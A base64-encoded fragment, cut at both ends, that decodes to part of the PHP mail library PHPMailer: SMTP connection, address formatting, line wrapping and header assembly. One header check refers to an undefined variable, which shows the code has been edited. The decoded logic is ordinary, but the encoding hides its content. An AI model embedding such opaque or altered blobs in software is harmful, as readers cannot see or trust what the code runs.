kxhbmcoJ2RhdGFfbm90X2FjY2VwdGVkJykpOwogICAgICAkdGhpcy0+c210cC0+UmVzZXQoKTsKICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQogICAgaWYoJHRoaXMtPlNNVFBLZWVwQWxpdmUgPT0gdHJ1ZSkgewogICAgICAkdGhpcy0+c210cC0+UmVzZXQoKTsKICAgIH0gZWxzZSB7CiAgICAgICR0aGlzLT5TbXRwQ2xvc2UoKTsKICAgIH0KCiAgICByZXR1cm4gdHJ1ZTsKICB9CgogIC8qKgogICAqIEluaXRpYXRlcyBhIGNvbm5lY3Rpb24gdG8gYW4gU01UUCBzZXJ2ZXIuICBSZXR1cm5zIGZhbHNlIGlmIHRoZQogICAqIG9wZXJhdGlvbiBmYWlsZWQuCiAgICogQGFjY2VzcyBwcml2YXRlCiAgICogQHJldHVybiBib29sCiAgICovCiAgZnVuY3Rpb24gU210cENvbm5lY3QoKSB7CiAgICBpZigkdGhpcy0+c210cCA9PSBOVUxMKSB7CiAgICAgICR0aGlzLT5zbXRwID0gbmV3IFNNVFAoKTsKICAgIH0KCiAgICAkdGhpcy0+c210cC0+ZG9fZGVidWcgPSAkdGhpcy0+U01UUERlYnVnOwogICAgJGhvc3RzID0gZXhwbG9kZSgnOycsICR0aGlzLT5Ib3N0KTsKICAgICRpbmRleCA9IDA7CiAgICAkY29ubmVjdGlvbiA9ICgkdGhpcy0+c210cC0+Q29ubmVjdGVkKCkpOwoKICAgIC8qIFJldHJ5IHdoaWxlIHRoZXJlIGlzIG5vIGNvbm5lY3Rpb24gKi8KICAgIHdoaWxlKCRpbmRleCA8IGNvdW50KCRob3N0cykgJiYgJGNvbm5lY3Rpb24gPT0gZmFsc2UpIHsKICAgICAgJGhvc3RpbmZvID0gYXJyYXkoKTsKICAgICAgaWYoZXJlZ2koJ14oLispOihbMC05XSspJCcsICRob3N0c1skaW5kZXhdLCAkaG9zdGluZm8pKSB7CiAgICAgICAgJGhvc3QgPSAkaG9zdGluZm9bMV07CiAgICAgICAgJHBvcnQgPSAkaG9zdGluZm9bMl07CiAgICAgIH0gZWxzZSB7CiAgICAgICAgJGhvc3QgPSAkaG9zdHNbJGluZGV4XTsKICAgICAgICAkcG9ydCA9ICR0aGlzLT5Qb3J0OwogICAgICB9CgogICAgICBpZigkdGhpcy0+c210cC0+Q29ubmVjdCgoKCFlbXB0eSgkdGhpcy0+U01UUFNlY3VyZSkpPyR0aGlzLT5TTVRQU2VjdXJlLic6Ly8nOicnKS4kaG9zdCwgJHBvcnQsICR0aGlzLT5UaW1lb3V0KSkgewogICAgICAgIGlmICgkdGhpcy0+SGVsbyAhPSAnJykgewogICAgICAgICAgJHRoaXMtPnNtdHAtPkhlbGxvKCR0aGlzLT5IZWxvKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgJHRoaXMtPnNtdHAtPkhlbGxvKCR0aGlzLT5TZXJ2ZXJIb3N0bmFtZSgpKTsKICAgICAgICB9CgogICAgICAgICRjb25uZWN0aW9uID0gdHJ1ZTsKICAgICAgICBpZigkdGhpcy0+U01UUEF1dGgpIHsKICAgICAgICAgIGlmKCEkdGhpcy0+c210cC0+QXV0aGVudGljYXRlKCR0aGlzLT5Vc2VybmFtZSwgJHRoaXMtPlBhc3N3b3JkKSkgewogICAgICAgICAgICAkdGhpcy0+U2V0RXJyb3IoJHRoaXMtPkxhbmcoJ2F1dGhlbnRpY2F0ZScpKTsKICAgICAgICAgICAgJHRoaXMtPnNtdHAtPlJlc2V0KCk7CiAgICAgICAgICAgICRjb25uZWN0aW9uID0gZmFsc2U7CiAgICAgICAgICB9CiAgICAgICAgfQogICAgICB9CiAgICAgICRpbmRleCsrOwogICAgfQogICAgaWYoISRjb25uZWN0aW9uKSB7CiAgICAgICR0aGlzLT5TZXRFcnJvcigkdGhpcy0+TGFuZygnY29ubmVjdF9ob3N0JykpOwogICAgfQoKICAgIHJldHVybiAkY29ubmVjdGlvbjsKICB9CgogIC8qKgogICAqIENsb3NlcyB0aGUgYWN0aXZlIFNNVFAgc2Vzc2lvbiBpZiBvbmUgZXhpc3RzLgogICAqIEByZXR1cm4gdm9pZAogICAqLwogIGZ1bmN0aW9uIFNtdHBDbG9zZSgpIHsKICAgIGlmKCR0aGlzLT5zbXRwICE9IE5VTEwpIHsKICAgICAgaWYoJHRoaXMtPnNtdHAtPkNvbm5lY3RlZCgpKSB7CiAgICAgICAgJHRoaXMtPnNtdHAtPlF1aXQoKTsKICAgICAgICAkdGhpcy0+c210cC0+Q2xvc2UoKTsKICAgICAgfQogICAgfQogIH0KCiAgLyoqCiAgICogU2V0cyB0aGUgbGFuZ3VhZ2UgZm9yIGFsbCBjbGFzcyBlcnJvciBtZXNzYWdlcy4gIFJldHVybnMgZmFsc2UKICAgKiBpZiBpdCBjYW5ub3QgbG9hZCB0aGUgbGFuZ3VhZ2UgZmlsZS4gIFRoZSBkZWZhdWx0IGxhbmd1YWdlIHR5cGUKICAgKiBpcyBFbmdsaXNoLgogICAqIEBwYXJhbSBzdHJpbmcgJGxhbmdfdHlwZSBUeXBlIG9mIGxhbmd1YWdlIChlLmcuIFBvcnR1Z3Vlc2U6ICJiciIpCiAgICogQHBhcmFtIHN0cmluZyAkbGFuZ19wYXRoIFBhdGggdG8gdGhlIGxhbmd1YWdlIGZpbGUgZGlyZWN0b3J5CiAgICogQGFjY2VzcyBwdWJsaWMKICAgKiBAcmV0dXJuIGJvb2wKICAgKi8KICBmdW5jdGlvbiBTZXRMYW5ndWFnZSgkbGFuZ190eXBlLCAkbGFuZ19wYXRoID0gJ2xhbmd1YWdlLycpIHsKICAgIGlmKGZpbGVfZXhpc3RzKCRsYW5nX3BhdGguJ3BocG1haWxlci5sYW5nLScuJGxhbmdfdHlwZS4nLnBocCcpKSB7CiAgICAgIGluY2x1ZGUoJGxhbmdfcGF0aC4ncGhwbWFpbGVyLmxhbmctJy4kbGFuZ190eXBlLicucGhwJyk7CiAgICB9IGVsc2VpZiAoZmlsZV9leGlzdHMoJGxhbmdfcGF0aC4ncGhwbWFpbGVyLmxhbmctZW4ucGhwJykpIHsKICAgICAgaW5jbHVkZSgkbGFuZ19wYXRoLidwaHBtYWlsZXIubGFuZy1lbi5waHAnKTsKICAgIH0gZWxzZSB7CiAgICAgICR0aGlzLT5TZXRFcnJvcignQ291bGQgbm90IGxvYWQgbGFuZ3VhZ2UgZmlsZScpOwogICAgICByZXR1cm4gZmFsc2U7CiAgICB9CiAgICAkdGhpcy0+bGFuZ3VhZ2UgPSAkUEhQTUFJTEVSX0xBTkc7CgogICAgcmV0dXJuIHRydWU7CiAgfQoKICAvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCiAgLy8gTUVUSE9EUywgTUVTU0FHRSBDUkVBVElPTgogIC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8KCiAgLyoqCiAgICogQ3JlYXRlcyByZWNpcGllbnQgaGVhZGVycy4KICAgKiBAYWNjZXNzIHByaXZhdGUKICAgKiBAcmV0dXJuIHN0cmluZwogICAqLwogIGZ1bmN0aW9uIEFkZHJBcHBlbmQoJHR5cGUsICRhZGRyKSB7CiAgICAkYWRkcl9zdHIgPSAkdHlwZSAuICc6ICc7CiAgICAkYWRkcl9zdHIgLj0gJHRoaXMtPkFkZHJGb3JtYXQoJGFkZHJbMF0pOwogICAgaWYoY291bnQoJGFkZHIpID4gMSkgewogICAgICBmb3IoJGkgPSAxOyAkaSA8IGNvdW50KCRhZGRyKTsgJGkrKykgewogICAgICAgICRhZGRyX3N0ciAuPSAnLCAnIC4gJHRoaXMtPkFkZHJGb3JtYXQoJGFkZHJbJGldKTsKICAgICAgfQogICAgfQogICAgJGFkZHJfc3RyIC49ICR0aGlzLT5MRTsKCiAgICByZXR1cm4gJGFkZHJfc3RyOwogIH0KCiAgLyoqCiAgICogRm9ybWF0cyBhbiBhZGRyZXNzIGNvcnJlY3RseS4KICAgKiBAYWNjZXNzIHByaXZhdGUKICAgKiBAcmV0dXJuIHN0cmluZwogICAqLwogIGZ1bmN0aW9uIEFkZHJGb3JtYXQoJGFkZHIpIHsKICAgIGlmKGVtcHR5KCRhZGRyWzFdKSkgewogICAgICAkZm9ybWF0dGVkID0gJHRoaXMtPlNlY3VyZUhlYWRlcigkYWRkclswXSk7CiAgICB9IGVsc2UgewogICAgICAkZm9ybWF0dGVkID0gJHRoaXMtPkVuY29kZUhlYWRlcigkdGhpcy0+U2VjdXJlSGVhZGVyKCRhZGRyWzFdKSwgJ3BocmFzZScpIC4gIiA8IiAuICR0aGlzLT5TZWN1cmVIZWFkZXIoJGFkZHJbMF0pIC4gIj4iOwogICAgfQoKICAgIHJldHVybiAkZm9ybWF0dGVkOwogIH0KCiAgLyoqCiAgICogV3JhcHMgbWVzc2FnZSBmb3IgdXNlIHdpdGggbWFpbGVycyB0aGF0IGRvIG5vdAogICAqIGF1dG9tYXRpY2FsbHkgcGVyZm9ybSB3cmFwcGluZyBhbmQgZm9yIHF1b3RlZC1wcmludGFibGUuCiAgICogT3JpZ2luYWwgd3JpdHRlbiBieSBwaGlsaXBwZS4KICAgKiBAYWNjZXNzIHByaXZhdGUKICAgKiBAcmV0dXJuIHN0cmluZwogICAqLwogIGZ1bmN0aW9uIFdyYXBUZXh0KCRtZXNzYWdlLCAkbGVuZ3RoLCAkcXBfbW9kZSA9IGZhbHNlKSB7CiAgICAkc29mdF9icmVhayA9ICgkcXBfbW9kZSkgPyBzcHJpbnRmKCIgPSVzIiwgJHRoaXMtPkxFKSA6ICR0aGlzLT5MRTsKICAgIC8vIElmIHV0Zi04IGVuY29kaW5nIGlzIHVzZWQsIHdlIHdpbGwgbmVlZCB0byBtYWtlIHN1cmUgd2UgZG9uJ3QKICAgIC8vIHNwbGl0IG11bHRpYnl0ZSBjaGFyYWN0ZXJzIHdoZW4gd2Ugd3JhcAogICAgJGlzX3V0ZjggPSAoc3RydG9sb3dlcigkdGhpcy0+Q2hhclNldCkgPT0gInV0Zi04Iik7CgogICAgJG1lc3NhZ2UgPSAkdGhpcy0+Rml4RU9MKCRtZXNzYWdlKTsKICAgIGlmIChzdWJzdHIoJG1lc3NhZ2UsIC0xKSA9PSAkdGhpcy0+TEUpIHsKICAgICAgJG1lc3NhZ2UgPSBzdWJzdHIoJG1lc3NhZ2UsIDAsIC0xKTsKICAgIH0KCiAgICAkbGluZSA9IGV4cGxvZGUoJHRoaXMtPkxFLCAkbWVzc2FnZSk7CiAgICAkbWVzc2FnZSA9ICcnOwogICAgZm9yICgkaT0wIDskaSA8IGNvdW50KCRsaW5lKTsgJGkrKykgewogICAgICAkbGluZV9wYXJ0ID0gZXhwbG9kZSgnICcsICRsaW5lWyRpXSk7CiAgICAgICRidWYgPSAnJzsKICAgICAgZm9yICgkZSA9IDA7ICRlPGNvdW50KCRsaW5lX3BhcnQpOyAkZSsrKSB7CiAgICAgICAgJHdvcmQgPSAkbGluZV9wYXJ0WyRlXTsKICAgICAgICBpZiAoJHFwX21vZGUgYW5kIChzdHJsZW4oJHdvcmQpID4gJGxlbmd0aCkpIHsKICAgICAgICAgICRzcGFjZV9sZWZ0ID0gJGxlbmd0aCAtIHN0cmxlbigkYnVmKSAtIDE7CiAgICAgICAgICBpZiAoJGUgIT0gMCkgewogICAgICAgICAgICBpZiAoJHNwYWNlX2xlZnQgPiAyMCkgewogICAgICAgICAgICAgICRsZW4gPSAkc3BhY2VfbGVmdDsKICAgICAgICAgICAgICBpZiAoJGlzX3V0ZjgpIHsKICAgICAgICAgICAgICAgICRsZW4gPSAkdGhpcy0+VVRGOENoYXJCb3VuZGFyeSgkd29yZCwgJGxlbik7CiAgICAgICAgICAgICAgfSBlbHNlaWYgKHN1YnN0cigkd29yZCwgJGxlbiAtIDEsIDEpID09ICI9IikgewogICAgICAgICAgICAgICAgJGxlbi0tOwogICAgICAgICAgICAgIH0gZWxzZWlmIChzdWJzdHIoJHdvcmQsICRsZW4gLSAyLCAxKSA9PSAiPSIpIHsKICAgICAgICAgICAgICAgICRsZW4gLT0gMjsKICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgJHBhcnQgPSBzdWJzdHIoJHdvcmQsIDAsICRsZW4pOwogICAgICAgICAgICAgICR3b3JkID0gc3Vic3RyKCR3b3JkLCAkbGVuKTsKICAgICAgICAgICAgICAkYnVmIC49ICcgJyAuICRwYXJ0OwogICAgICAgICAgICAgICRtZXNzYWdlIC49ICRidWYgLiBzcHJpbnRmKCI9JXMiLCAkdGhpcy0+TEUpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICRtZXNzYWdlIC49ICRidWYgLiAkc29mdF9icmVhazsKICAgICAgICAgICAgfQogICAgICAgICAgICAkYnVmID0gJyc7CiAgICAgICAgICB9CiAgICAgICAgICB3aGlsZSAoc3RybGVuKCR3b3JkKSA+IDApIHsKICAgICAgICAgICAgJGxlbiA9ICRsZW5ndGg7CiAgICAgICAgICAgIGlmICgkaXNfdXRmOCkgewogICAgICAgICAgICAgICRsZW4gPSAkdGhpcy0+VVRGOENoYXJCb3VuZGFyeSgkd29yZCwgJGxlbik7CiAgICAgICAgICAgIH0gZWxzZWlmIChzdWJzdHIoJHdvcmQsICRsZW4gLSAxLCAxKSA9PSAiPSIpIHsKICAgICAgICAgICAgICAkbGVuLS07CiAgICAgICAgICAgIH0gZWxzZWlmIChzdWJzdHIoJHdvcmQsICRsZW4gLSAyLCAxKSA9PSAiPSIpIHsKICAgICAgICAgICAgICAkbGVuIC09IDI7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJHBhcnQgPSBzdWJzdHIoJHdvcmQsIDAsICRsZW4pOwogICAgICAgICAgICAkd29yZCA9IHN1YnN0cigkd29yZCwgJGxlbik7CgogICAgICAgICAgICBpZiAoc3RybGVuKCR3b3JkKSA+IDApIHsKICAgICAgICAgICAgICAkbWVzc2FnZSAuPSAkcGFydCAuIHNwcmludGYoIj0lcyIsICR0aGlzLT5MRSk7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgJGJ1ZiA9ICRwYXJ0OwogICAgICAgICAgICB9CiAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICRidWZfbyA9ICRidWY7CiAgICAgICAgICAkYnVmIC49ICgkZSA9PSAwKSA/ICR3b3JkIDogKCcgJyAuICR3b3JkKTsKCiAgICAgICAgICBpZiAoc3RybGVuKCRidWYpID4gJGxlbmd0aCBhbmQgJGJ1Zl9vICE9ICcnKSB7CiAgICAgICAgICAgICRtZXNzYWdlIC49ICRidWZfbyAuICRzb2Z0X2JyZWFrOwogICAgICAgICAgICAkYnVmID0gJHdvcmQ7CiAgICAgICAgICB9CiAgICAgICAgfQogICAgICB9CiAgICAgICRtZXNzYWdlIC49ICRidWYgLiAkdGhpcy0+TEU7CiAgICB9CgogICAgcmV0dXJuICRtZXNzYWdlOwogIH0KCiAgLyoqCiAgICogRmluZHMgbGFzdCBjaGFyYWN0ZXIgYm91bmRhcnkgcHJpb3IgdG8gbWF4TGVuZ3RoIGluIGEgdXRmLTgKICAgKiBxdW90ZWQgKHByaW50YWJsZSkgZW5jb2RlZCBzdHJpbmcuCiAgICogT3JpZ2luYWwgd3JpdHRlbiBieSBDb2xpbiBCcm93bi4KICAgKiBAYWNjZXNzIHByaXZhdGUKICAgKiBAcGFyYW0gc3RyaW5nICRlbmNvZGVkVGV4dCB1dGYtOCBRUCB0ZXh0CiAgICogQHBhcmFtIGludCAgICAkbWF4TGVuZ3RoICAgZmluZCBsYXN0IGNoYXJhY3RlciBib3VuZGFyeSBwcmlvciB0byB0aGlzIGxlbmd0aAogICAqIEByZXR1cm4gaW50CiAgICovCiAgZnVuY3Rpb24gVVRGOENoYXJCb3VuZGFyeSgkZW5jb2RlZFRleHQsICRtYXhMZW5ndGgpIHsKICAgICRmb3VuZFNwbGl0UG9zID0gZmFsc2U7CiAgICAkbG9va0JhY2sgPSAzOwogICAgd2hpbGUgKCEkZm91bmRTcGxpdFBvcykgewogICAgICAkbGFzdENodW5rID0gc3Vic3RyKCRlbmNvZGVkVGV4dCwgJG1heExlbmd0aCAtICRsb29rQmFjaywgJGxvb2tCYWNrKTsKICAgICAgJGVuY29kZWRDaGFyUG9zID0gc3RycG9zKCRsYXN0Q2h1bmssICI9Iik7CiAgICAgIGlmICgkZW5jb2RlZENoYXJQb3MgIT09IGZhbHNlKSB7CiAgICAgICAgLy8gRm91bmQgc3RhcnQgb2YgZW5jb2RlZCBjaGFyYWN0ZXIgYnl0ZSB3aXRoaW4gJGxvb2tCYWNrIGJsb2NrLgogICAgICAgIC8vIENoZWNrIHRoZSBlbmNvZGVkIGJ5dGUgdmFsdWUgKHRoZSAyIGNoYXJzIGFmdGVyIHRoZSAnPScpCiAgICAgICAgJGhleCA9IHN1YnN0cigkZW5jb2RlZFRleHQsICRtYXhMZW5ndGggLSAkbG9va0JhY2sgKyAkZW5jb2RlZENoYXJQb3MgKyAxLCAyKTsKICAgICAgICAkZGVjID0gaGV4ZGVjKCRoZXgpOwogICAgICAgIGlmICgkZGVjIDwgMTI4KSB7IC8vIFNpbmdsZSBieXRlIGNoYXJhY3Rlci4KICAgICAgICAgIC8vIElmIHRoZSBlbmNvZGVkIGNoYXIgd2FzIGZvdW5kIGF0IHBvcyAwLCBpdCB3aWxsIGZpdAogICAgICAgICAgLy8gb3RoZXJ3aXNlIHJlZHVjZSBtYXhMZW5ndGggdG8gc3RhcnQgb2YgdGhlIGVuY29kZWQgY2hhcgogICAgICAgICAgJG1heExlbmd0aCA9ICgkZW5jb2RlZENoYXJQb3MgPT0gMCkgPyAkbWF4TGVuZ3RoIDoKICAgICAgICAgICRtYXhMZW5ndGggLSAoJGxvb2tCYWNrIC0gJGVuY29kZWRDaGFyUG9zKTsKICAgICAgICAgICRmb3VuZFNwbGl0UG9zID0gdHJ1ZTsKICAgICAgICB9IGVsc2VpZiAoJGRlYyA+PSAxOTIpIHsgLy8gRmlyc3QgYnl0ZSBvZiBhIG11bHRpIGJ5dGUgY2hhcmFjdGVyCiAgICAgICAgICAvLyBSZWR1Y2UgbWF4TGVuZ3RoIHRvIHNwbGl0IGF0IHN0YXJ0IG9mIGNoYXJhY3RlcgogICAgICAgICAgJG1heExlbmd0aCA9ICRtYXhMZW5ndGggLSAoJGxvb2tCYWNrIC0gJGVuY29kZWRDaGFyUG9zKTsKICAgICAgICAgICRmb3VuZFNwbGl0UG9zID0gdHJ1ZTsKICAgICAgICB9IGVsc2VpZiAoJGRlYyA8IDE5MikgeyAvLyBNaWRkbGUgYnl0ZSBvZiBhIG11bHRpIGJ5dGUgY2hhcmFjdGVyLCBsb29rIGZ1cnRoZXIgYmFjawogICAgICAgICAgJGxvb2tCYWNrICs9IDM7CiAgICAgICAgfQogICAgICB9IGVsc2UgewogICAgICAgIC8vIE5vIGVuY29kZWQgY2hhcmFjdGVyIGZvdW5kCiAgICAgICAgJGZvdW5kU3BsaXRQb3MgPSB0cnVlOwogICAgICB9CiAgICB9CiAgICByZXR1cm4gJG1heExlbmd0aDsKICB9CgogIC8qKgogICAqIFNldCB0aGUgYm9keSB3cmFwcGluZy4KICAgKiBAYWNjZXNzIHByaXZhdGUKICAgKiBAcmV0dXJuIHZvaWQKICAgKi8KICBmdW5jdGlvbiBTZXRXb3JkV3JhcCgpIHsKICAgIGlmKCR0aGlzLT5Xb3JkV3JhcCA8IDEpIHsKICAgICAgcmV0dXJuOwogICAgfQoKICAgIHN3aXRjaCgkdGhpcy0+bWVzc2FnZV90eXBlKSB7CiAgICAgIGNhc2UgJ2FsdCc6CiAgICAgICAgLyogZmFsbCB0aHJvdWdoICovCiAgICAgIGNhc2UgJ2FsdF9hdHRhY2htZW50cyc6CiAgICAgICAgJHRoaXMtPkFsdEJvZHkgPSAkdGhpcy0+V3JhcFRleHQoJHRoaXMtPkFsdEJvZHksICR0aGlzLT5Xb3JkV3JhcCk7CiAgICAgICAgYnJlYWs7CiAgICAgIGRlZmF1bHQ6CiAgICAgICAgJHRoaXMtPkJvZHkgPSAkdGhpcy0+V3JhcFRleHQoJHRoaXMtPkJvZHksICR0aGlzLT5Xb3JkV3JhcCk7CiAgICAgICAgYnJlYWs7CiAgICB9CiAgfQoKICAvKioKICAgKiBBc3NlbWJsZXMgbWVzc2FnZSBoZWFkZXIuCiAgICogQGFjY2VzcyBwcml2YXRlCiAgICogQHJldHVybiBzdHJpbmcKICAgKi8KICBmdW5jdGlvbiBDcmVhdGVIZWFkZXIoKSB7CiAgICAkcmVzdWx0ID0gJyc7CgogICAgLyogU2V0IHRoZSBib3VuZGFyaWVzICovCiAgICAkdW5pcV9pZCA9IG1kNSh1bmlxaWQodGltZSgpKSk7CiAgICAkdGhpcy0+Ym91bmRhcnlbMV0gPSAnYjFfJyAuICR1bmlxX2lkOwogICAgJHRoaXMtPmJvdW5kYXJ5WzJdID0gJ2IyXycgLiAkdW5pcV9pZDsKCiAgICAkcmVzdWx0IC49ICR0aGlzLT5IZWFkZXJMaW5lKCdEYXRlJywgJHRoaXMtPlJGQ0RhdGUoKSk7CiAgICBpZigkdGhpcy0+U2VuZGVyID09ICcnKSB7CiAgICAgICRyZXN1bHQgLj0gJHRoaXMtPkhlYWRlckxpbmUoJ1JldHVybi1QYXRoJywgdHJpbSgkdGhpcy0+RnJvbSkpOwogICAgfSBlbHNlIHsKICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+SGVhZGVyTGluZSgnUmV0dXJuLVBhdGgnLCB0cmltKCR0aGlzLT5TZW5kZXIpKTsKICAgIH0KCiAgICAvKiBUbyBiZSBjcmVhdGVkIGF1dG9tYXRpY2FsbHkgYnkgbWFpbCgpICovCiAgICBpZigkdGhpcy0+TWFpbGVyICE9ICdtYWlsJykgewogICAgICBpZihjb3VudCgkdGhpcy0+dG8pID4gMCkgewogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPkFkZHJBcHBlbmQoJ1RvJywgJHRoaXMtPnRvKTsKICAgICAgfSBlbHNlaWYgKGNvdW50KCR0aGlzLT5jYykgPT0gMCkgewogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPkhlYWRlckxpbmUoJ1RvJywgJ3VuZGlzY2xvc2VkLXJlY2lwaWVudHM6OycpOwogICAgICB9CiAgICAgIGlmKGNvdW50KCR0aGlzLT5jYykgPiAwKSB7CiAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+QWRkckFwcGVuZCgnQ2MnLCAkdGhpcy0+Y2MpOwogICAgICB9CiAgICB9CgogICAgJGZyb20gPSBhcnJheSgpOwogICAgJGZyb21bMF1bMF0gPSB0cmltKCR0aGlzLT5Gcm9tKTsKICAgICRmcm9tWzBdWzFdID0gJHRoaXMtPkZyb21OYW1lOwogICAgJHJlc3VsdCAuPSAkdGhpcy0+QWRkckFwcGVuZCgnRnJvbScsICRmcm9tKTsKCiAgICAvKiBzZW5kbWFpbCBhbmQgbWFpbCgpIGV4dHJhY3QgQ2MgZnJvbSB0aGUgaGVhZGVyIGJlZm9yZSBzZW5kaW5nICovCiAgICBpZigoKCR0aGlzLT5NYWlsZXIgPT0gJ3NlbmRtYWlsJykgfHwgKCR0aGlzLT5NYWlsZXIgPT0gJ21haWwnKSkgJiYgKGNvdW50KCR0aGlzLT5jYykgPiAwKSkgewogICAgICAkcmVzdWx0IC49ICR0aGlzLT5BZGRyQXBwZW5kKCdDYycsICR0aGlzLT5jYyk7CiAgICB9CgogICAgLyogc2VuZG1haWwgYW5kIG1haWwoKSBleHRyYWN0IEJjYyBmcm9tIHRoZSBoZWFkZXIgYmVmb3JlIHNlbmRpbmcgKi8KICAgIGlmKCgoJHRoaXMtPk1haWxlciA9PSAnc2VuZG1haWwnKSB8fCAoJHRoaXMtPk1haWxlciA9PSAnbWFpbCcpKSAmJiAoY291bnQoJHRoaXMtPmJjYykgPiAwKSkgewogICAgICAkcmVzdWx0IC49ICR0aGlzLT5BZGRyQXBwZW5kKCdCY2MnLCAkdGhpcy0+YmNjKTsKICAgIH0KCWlmKCRyZXBseXRvICE9ICIiKQoJewogICAgaWYoY291bnQoJHRoaXMtPlJlcGx5VG8pID4gMCkgewogICAgICAkcmVzdWx0IC49ICR0aGlzLT5BZGRyQXBwZW5kKCdSZXBseS1UbycsICR0aGlzLT5SZXBseVRvKTsKICAgIH0KCX0KICAgIC8qIG1haWwoKSBzZXRzIHRoZSBzdWJqZWN0IGl0c2VsZiAqLwogICAgaWYoJHRoaXMtPk1haWxlciAhPSAnbWFpbCcpIHsKICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+SGVhZGVyTGluZSgnU3ViamVjdCcsICR0aGlzLT5FbmNvZGVIZWFkZXIoJHRoaXMtPlNlY3VyZUhlYWRlcigkdGhpcy0+U3ViamVjdCkpKTsKICAgIH0KCiAgICBpZigkdGhpcy0+TWVzc2FnZUlEICE9ICcnKSB7CiAgICAgICRyZXN1bHQgLj0gJHRoaXMtPkhlYWRlckxpbmUoJ01lc3NhZ2UtSUQnLCR0aGlzLT5NZXNzYWdlSUQpOwogICAgfSBlbHNlIHsKICAgICAgJHJlc3VsdCAuPSBzcHJpbnRmKCJNZXNzYWdlLUlEOiA8JXNAJXM+JXMiLCAkdW5pcV9pZCwgJHRoaXMtPlNlcnZlckhvc3RuYW1lKCksICR0aGlzLT5MRSk7CiAgICB9CiAgICAkcmVzdWx0IC49ICR0aGlzLT5IZWFkZXJMaW5lKCdYLVByaW9yaXR5JywgJHRoaXMtPlByaW9yaXR5KTsKICAgIGlmKCR0aGlzLT5Db25maXJtUmVhZGluZ1RvICE9ICcnKSB7CiAgICAgICRyZXN1bHQgLj0gJHRoaXMtPkhlYWRlckxpbmUoJ0Rpc3Bvc2l0aW9uLU5vdGlmaWNhdGlvbi1UbycsICc8JyAuIHRyaW0oJHRoaXMtPkNvbmZpcm1SZWFkaW5nVG8pIC4gJz4nKTsKICAgIH0KCiAgICAvLyBBZGQgY3VzdG9tIGhlYWRlcnMKICAgIGZvcigkaW5kZXggPSAwOyAkaW5kZXggPCBjb3VudCgkdGhpcy0+Q3VzdG9tSGVhZGVyKTsgJGluZGV4KyspIHsKICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+SGVhZGVyTGluZSh0cmltKCR0aGlzLT5DdXN0b21IZWFkZXJbJGluZGV4XVswXSksICR0aGlzLT5FbmNvZGVIZWFkZXIodHJpbSgkdGhpcy0+Q3VzdG9tSGVhZGVyWyRpbmRleF1bMV0pKSk7CiAgICB9CiAgICBpZiAoISR0aGlzLT5zaWduX2tleV9maWxlKSB7CiAgICAgICRyZXN1bHQgLj0gJHRoaXMtPkhlYWRlckxpbmUoJ01JTUUtVmVyc2lvbicsICcxLjAnKTsKICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+R2V0TWFpbE1JTUUoKTsKICAgIH0KCiAgICByZXR1cm4gJHJlc3VsdDsKICB9CgogIC8qKgogICAqIFJldHVybnMgdGhlIG1lc3NhZ2UgTUlNRS4KICAgKiBAYWNjZXNzIHByaXZhdGUKICAgKiBAcmV0dXJuIHN0cmluZwogICAqLwogIGZ1bmN0aW9uIEdldE1haWxNSU1FKCkgewogICAgJHJlc3VsdCA9ICcnOwogICAgc3dpdGNoKCR0aGlzLT5tZXNzYWdlX3R5cGUpIHsKICAgICAgY2FzZSAncGxhaW4nOgogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPkhlYWRlckxpbmUoJ0NvbnRlbnQtVHJhbnNmZXItRW5jb2RpbmcnLCAkdGhpcy0+RW5jb2RpbmcpOwogICAgICAgICRyZXN1bHQgLj0gc3ByaW50ZigiQ29udGVudC1UeXBlOiAlczsgY2hhcnNldD1cIiVzXCIiLCAkdGhpcy0+Q29udGVudFR5cGUsICR0aGlzLT5DaGFyU2V0KTsKICAgICAgICBicmVhazsKICAgICAgY2FzZSAnYXR0YWNobWVudHMnOgogICAgICAgIC8qIGZhbGwgdGhyb3VnaCAqLwogICAgICBjYXNlICdhbHRfYXR0YWNobWVudHMnOgogICAgICAgIGlmKCR0aGlzLT5JbmxpbmVJbWFnZUV4aXN0cygpKXsKICAgICAgICAgICRyZXN1bHQgLj0gc3ByaW50ZigiQ29udGVudC1UeXBlOiAlczslc1x0dHlwZT1cInRleHQvaHRtbFwiOyVzXHRib3VuZGFyeT1cIiVzXCIlcyIsICdtdWx0aXBhcnQvcmVsYXRlZCcsICR0aGlzLT5MRSwgJHRoaXMtPkxFLCAkdGhpcy0+Ym91bmRhcnlbMV0sICR0aGlzLT5MRSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPkhlYWRlckxpbmUoJ0NvbnRlbnQtVHlwZScsICdtdWx0aXBhcnQvbWl4ZWQ7Jyk7CiAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5UZXh0TGluZSgiXHRib3VuZGFyeT1cIiIgLiAkdGhpcy0+Ym91bmRhcnlbMV0gLiAnIicpOwogICAgICAgIH0KICAgICAgICBicmVhazsKICAgICAgY2FzZSAnYWx0JzoKICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5IZWFkZXJMaW5lKCdDb250ZW50LVR5cGUnLCAnbXVsdGlwYXJ0L2FsdGVybmF0aXZlOycpOwogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPlRleHRMaW5lKCJcdGJvdW5kYXJ5PVwiIiAuICR0aGlzLT5ib3VuZGFyeVsxXSAuICciJyk7CiAgICAgICAgYnJlYWs7CiAgICB9CgogICAgaWYoJHRoaXMtPk1haWxlciAhPSAnbWFpbCcpIHsK